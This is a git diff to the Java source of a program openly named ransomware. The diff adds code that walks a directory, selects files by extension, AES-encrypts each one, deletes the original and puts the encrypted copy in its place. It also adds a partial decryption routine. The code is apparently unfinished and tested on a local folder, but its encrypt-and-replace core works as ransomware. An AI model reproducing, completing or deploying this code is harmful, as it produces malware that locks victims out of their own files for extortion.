@@ -4,15 +4,18 @@
  * and open the template in the editor.
  */
 package ransomware;
-import static com.sun.org.apache.xml.internal.security.encryption.XMLCipher.AES_128;
 import commandLineArgsParser.*;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
+import java.util.ArrayList;
 import java.util.Base64;
+import java.util.List;
 import javax.crypto.Cipher;
 import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
@@ -72,13 +75,77 @@ public class main {
         {
             IvParameterSpec IV = generateIV();
             SecretKey DecryptionKey = generateKey();
-            Path path = Paths.get("");
-            byte[] FileData = Files.readAllBytes(path);
-            doEncryption(FileData, DecryptionKey, IV);
+            Path path = Paths.get("/root/Desktop/cryptme");
+            
+            List<String> files = new ArrayList<String>();
+            List<String> FilesToEncrypt = new ArrayList<String>();
+            
+            Files.walk(path).forEach(filepath -> files.add(filepath.toString()));
+            
+            for(int i = 0; i < files.size(); i++)
+            {
+                for (int j = 0; j < FileTypesArray.length; j++)
+                {
+                    if (files.get(i).contains("." + FileTypesArray[j]))
+                    {
+                        FilesToEncrypt.add(files.get(i));
+                    }
+                }
+            }
+            
+            for (int i = 0; i < FilesToEncrypt.size(); i++)
+            {
+                Path FilePath = Paths.get(FilesToEncrypt.get(i));
+                byte[] FileData = Files.readAllBytes(FilePath);
+                doEncryption(FileData, DecryptionKey, IV, FilePath.toString() + ".enc");
+                
+                File file = new File(FilePath.toString());
+                file.delete();
+                
+                File fileB = new File(FilePath.toString() + ".enc");
+                fileB.renameTo(file);
+            }
+            
+            Path pathdec = Paths.get("/root/Desktop/TP1.pdfenc");
+            byte[] FileDataDec = Files.readAllBytes(pathdec);
+            doDecryption(FileDataDec, DecryptionKey, IV, pathdec.toString());
+        }
+        else
+        {
+            Path path = Paths.get(DecryptionInfoPath);
+            
+            List<String> files = new ArrayList<String>();
+            List<String> FilesToDecrypt = new ArrayList<String>();
+            
+            Files.walk(path).forEach(filepath -> files.add(filepath.toString()));
+            
+            for(int i = 0; i < files.size(); i++)
+            {
+                for (int j = 0; j < FileTypesArray.length; j++)
+                {
+                    if (files.get(i).contains("." + FileTypesArray[j]))
+                    {
+                        FilesToDecrypt.add(files.get(i));
+                    }
+                }
+            }
+            
+            for (int i = 0; i < FilesToDecrypt.size(); i++)
+            {
+                Path FilePath = Paths.get(FilesToDecrypt.get(i));
+                byte[] FileData = Files.readAllBytes(FilePath);
+                //doEncryption(FileData, DecryptionKey, IV, FilePath.toString() + ".enc");
+                
+                //File file = new File(FilePath.toString());
+                //file.delete();
+                
+                //File fileB = new File(FilePath.toString() + ".enc");
+                //fileB.renameTo(file);
+            }
         }
     }
     
-    public static void doEncryption(byte[] FileData, SecretKey key, IvParameterSpec iv)
+    public static void doEncryption(byte[] FileData, SecretKey key, IvParameterSpec iv, String EncryptedFileOutputPath)
     {
         try
         {
@@ -87,6 +154,34 @@ public class main {
             cipher.init(Cipher.ENCRYPT_MODE, key, iv);
   
             byte[] encryptedData = cipher.doFinal(FileData);
+            
+            FileOutputStream fos = new FileOutputStream(EncryptedFileOutputPath);
+            
+            fos.write(encryptedData);
+            
+            fos.close();
+        }
+        catch (Exception e)
+        {   
+            System.out.println("Error while encrypting: " + e.toString());
+        }
+    }
+    
+    public static void doDecryption(byte[] EncryptedFileData, SecretKey key, IvParameterSpec iv, String DecryptedFileOutputPath)
+    {
+        try
+        {
+            Cipher cipher = Cipher.getInstance("AES/CTR/PKCS5Padding");
+                  
+            cipher.init(Cipher.DECRYPT_MODE, key, iv);
+  
+            byte[] decryptedData = cipher.doFinal(EncryptedFileData);
+            
+            FileOutputStream fos = new FileOutputStream(DecryptedFileOutputPath);
+            
+            fos.write(decryptedData);
+            
+            fos.close();
         }
         catch (Exception e)
         {   
